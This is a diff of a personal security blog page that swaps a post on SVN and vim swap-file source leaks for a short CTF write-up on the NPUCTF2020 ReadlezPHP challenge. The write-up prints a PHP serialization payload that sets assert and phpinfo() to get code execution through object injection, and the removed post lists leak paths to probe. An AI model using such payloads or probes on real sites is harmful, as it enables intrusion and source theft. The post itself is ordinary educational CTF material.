@@ -20,19 +20,21 @@
     var CONFIG = {"hostname":"jingdaqiang.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="svn泄露SVN（subversion）是源代码版本管理软件。 在使用SVN管理本地代码过程中，会自动生成一个隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使隐藏文件夹被暴露于外网环境，这使得渗透工程师可以借助其中包含版本信息追踪的网站文件，逐步摸清站点结构。 在服务器上布署代码时。如果是使用 svn che">
+  <meta name="description" content="[NPUCTF2020]ReadlezPHP 想法：$b($a)这里可供我们操作。system好像被禁了，用assert（）序列化一下 12345678910111213141516&lt;?phpclass HelloPhp&amp;#123;    public $a;    public $b;    public function __construct()&amp;#123;        $this-">
 <meta property="og:type" content="article">
-<meta property="og:title" content="信息收集">
-<meta property="og:url" content="https://jingdaqiang.github.io/2021/03/15/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/index.html">
+<meta property="og:title" content="反序列化">
+<meta property="og:url" content="https://jingdaqiang.github.io/2021/03/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
 <meta property="og:site_name" content="Daq1ang">
-<meta property="og:description" content="svn泄露SVN（subversion）是源代码版本管理软件。 在使用SVN管理本地代码过程中，会自动生成一个隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使隐藏文件夹被暴露于外网环境，这使得渗透工程师可以借助其中包含版本信息追踪的网站文件，逐步摸清站点结构。 在服务器上布署代码时。如果是使用 svn che">
+<meta property="og:description" content="[NPUCTF2020]ReadlezPHP 想法：$b($a)这里可供我们操作。system好像被禁了，用assert（）序列化一下 12345678910111213141516&lt;?phpclass HelloPhp&amp;#123;    public $a;    public $b;    public function __construct()&amp;#123;        $this-">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-03-15T09:00:58.000Z">
-<meta property="article:modified_time" content="2021-03-15T10:13:30.329Z">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/03/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.0.png">
+<meta property="article:published_time" content="2021-03-20T14:22:06.000Z">
+<meta property="article:modified_time" content="2021-03-20T15:27:59.375Z">
 <meta property="article:author" content="六公子买单">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jingdaqiang.github.io/2021/03/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.0.png">
 
-<link rel="canonical" href="https://jingdaqiang.github.io/2021/03/15/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+<link rel="canonical" href="https://jingdaqiang.github.io/2021/03/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
 
 
 <script id="page-configurations">
@@ -45,7 +47,7 @@
   };
 </script>
 
-  <title>信息收集 | Daq1ang</title>
+  <title>反序列化 | Daq1ang</title>
   
 
 
@@ -150,7 +152,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/15/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -163,7 +165,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          信息收集
+          反序列化
         </h1>
 
         <div class="post-meta">
@@ -174,7 +176,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2021-03-15 17:00:58 / Modified: 18:13:30" itemprop="dateCreated datePublished" datetime="2021-03-15T17:00:58+08:00">2021-03-15</time>
+              <time title="Created: 2021-03-20 22:22:06 / Modified: 23:27:59" itemprop="dateCreated datePublished" datetime="2021-03-20T22:22:06+08:00">2021-03-20</time>
             </span>
 
           
@@ -188,11 +190,10 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="svn泄露"><a href="#svn泄露" class="headerlink" title="svn泄露"></a>svn泄露</h2><p>SVN（subversion）是源代码版本管理软件。 在使用SVN管理本地代码过程中，会自动生成一个隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使隐藏文件夹被暴露于外网环境，这使得渗透工程师可以借助其中包含版本信息追踪的网站文件，逐步摸清站点结构。 在服务器上布署代码时。如果是使用 svn checkout 功能来更新代码，而没有配置好目录访问权限，则会存在此漏洞。黑客利用此漏洞，可以下载整套网站的源代码。</p>
-<pre><code>/.svn/</code></pre>
-<hr>
-<h2 id="vim的缓存泄露"><a href="#vim的缓存泄露" class="headerlink" title="vim的缓存泄露"></a>vim的缓存泄露</h2><p>vim编辑文本时会创建一个临时文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。而本题的情景就是电脑死机了意外退出，导致存在临时文件</p>
-<pre><code>/index.php.swp</code></pre>
+        <h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p><img src="/2021/03/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.0.png"></p>
+<p>想法：$b($a)这里可供我们操作。<br>system好像被禁了，用assert（）<br>序列化一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a &#x3D; &quot;phpinfo()&quot;;</span><br><span class="line">        $this-&gt;b &#x3D; &quot;assert&quot;;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$c &#x3D; new HelloPhp();</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($c));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>flag在phpinfo()中，ctrl + F全局搜索读取</p>
 
     </div>
 
@@ -208,13 +209,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/03/08/buu17-32/" rel="prev" title="buu-17-32">
-      <i class="fa fa-chevron-left"></i> buu-17-32
+    <a href="/2021/03/20/SSRF/" rel="prev" title="SSRF">
+      <i class="fa fa-chevron-left"></i> SSRF
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2021/03/15/buu33-40/" rel="next" title="buu33-40">
-      buu33-40 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -273,7 +271,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#svn%E6%B3%84%E9%9C%B2"><span class="nav-number">1.</span> <span class="nav-text">svn泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vim%E7%9A%84%E7%BC%93%E5%AD%98%E6%B3%84%E9%9C%B2"><span class="nav-number">2.</span> <span class="nav-text">vim的缓存泄露</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#NPUCTF2020-ReadlezPHP"><span class="nav-number">1.</span> <span class="nav-text">[NPUCTF2020]ReadlezPHP</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
